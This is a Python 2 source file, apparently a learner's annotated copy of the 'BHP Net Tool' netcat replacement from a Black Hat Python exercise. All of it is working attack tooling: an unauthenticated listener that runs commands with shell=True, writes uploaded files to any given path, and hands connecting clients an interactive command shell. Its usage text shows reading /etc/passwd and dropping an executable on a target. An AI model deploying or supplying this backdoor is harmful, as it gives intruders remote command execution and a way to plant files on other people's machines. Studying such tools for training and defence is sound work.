import sys
import socket
import getopt
import threading 
import subprocess

# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
	print("BHP Net Tool")
	print()
	print("Usage: Chap2_Replacing_Netcat.py -t target_host -p port")
	print("-l  --listen 					- Listen on [host]:[port] for incoming connections")
	print("-e  --execute=file_to_run		- Execute the given command upon receiving a connection")
	print("-c  --command					- Initialize a command shell")
	print("-u  --upload=destination 		- Upon receiving a connection, upload a file and write to [destination]")

	print()
	print()
	print("Examples: ")
	print("Chap2_Replacing_Netcat.py -t 192.168.0.1 -p 5555 -l -c")
	print("Chap2_Replacing_Netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("Chap2_Replacing_Netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print("echo 'ABCDEFGHI' | ./Chap2_Replacing_Netcat.py -t target 192.168.0.1 -p 135")
	sys.exit(0) # Successful

def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]): # If no parameters were passed to ./Chap2_Replacing_Netcat.py, print Usage of the tool 
		usage()

	# read the command line options
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute=", "target=", "port=", "command", "upload="])

	except getopt.GetoptError as err:	
		print(str(err))
		usage()

	for o,a in opts:
		#print(o,a)
		#print("----------------")	
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--command"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"
		#print(listen, execute, command, upload_destination, target, port)
		#print(target, port)
		# are we going to listen or just send data from stdin?
		
	if not listen and len(target) and port > 0:

			# read in the buffer from the command line
			# this will block, so send Ctrl + D if not sending input
			# to stdin
		#buffer = raw_input("> ")c
		buffer = sys.stdin.read()
		#print("Buffer: %s" % buffer)

			#send data off
		client_sender(buffer) # --- Act as if we were a client sending data to a server ---

		# are we going to listen (-l) and potentially upload things (-u), 
		# execute commands (-e), and drop a shell back (-c), 
		# depending on our command line options above.
	if listen:
		server_loop() # --- Act as if we were a server, receiving data  (or a connection) from a client. ---

def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#Try to connect to our target host
		client.connect((target,port))

		if len(buffer):
			client.send(buffer)

		while True:
			# Now wait for data back from the client
			recv_len = 1 
			response = ""

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data

				if recv_len < 4096: # If client response is more than 4096 (i.e 8000 bytes), the while recv_len: loop will run twice (because the first time, recv_len will be equals
									# to 4096, as that's the max buffer we accept. The second time it will be 3904 (that's less than 4096), Meaning, if we 
									# receive less than 4096, we will break out, because that means, is the last PSH,ACK packet (remainaing data). In order words, we receive data back 
									# until there is no more data to receive
					break # will break out from the inner while loop (while recv_len:)
			#print("Inner loop exited")
			print response # if we put a comma "," at the end of print statement, it wont create a new line, so the raw_input() method will allows us to
							# input data next to the "response"

			# wait for more input from the user
			buffer = raw_input("")
			buffer += "\n"
			#print("Command sent \"%s\"" % buffer)
			client.send(buffer) # No need to call client_sender() method again, since we are inside the function already, and inside a while True loop.

	except:
		print("[*] Exception! Exiting.")

		# tear down the connection
		client.close()

def server_loop():
	global target

	# if no target is defined, we will listen in all interfaces
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# Spin off a thread to handle our new client
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command): 
	
	command = command.rstrip() # Trim the newline; remove training chars (strip whitespaces at the beginning or end of the command)

	# run the command (on this server; locally) and get the output back. 
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True) # Runs the command, and return the output. We use stderr to return any error output to STDOUT
		#proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		#output = proc.stdout.read() + proc.stderr.read()

	except: 
		output = "Failed to execute the command.\r\n"

	# send the output back to the client
	return output # Returns the output to the variable that called run_command(command) command.

def client_handler(client_socket):
	global upload
	global execute
	global command

	# check for upload
	if len(upload_destination):  # If -u option is passed.
		#read in all the bytes and write to our destination
		file_buffer = ""

		# keep reading data until none is available
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		# Now we take these bytes and try to write them out
		try:
			file_descriptor = open(upload_destination, "wb") # write in binary (wb)
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			# Acknowledge the we wrote the file out
			client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
		except:
			client_socket.send("Failed to save the file to %s\r\n" % upload_destination)

	# check for command execution
	if len(execute):  # If -e option is passed
		# run the command
		output = run_command(execute)
		client_socket.send(output)

	# now we go into another loop if command shell is requested
	if command: # If command set to True (-c)

		while True:

			client_socket.send("<BHP:#> ") # Send client a simple prompt

			# Now, we receive until we see a linefeed (enter key; which creates a new line; \n)
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			# send back the command output
			response = run_command(cmd_buffer)

			# send back the response
			client_socket.send(response)


main()
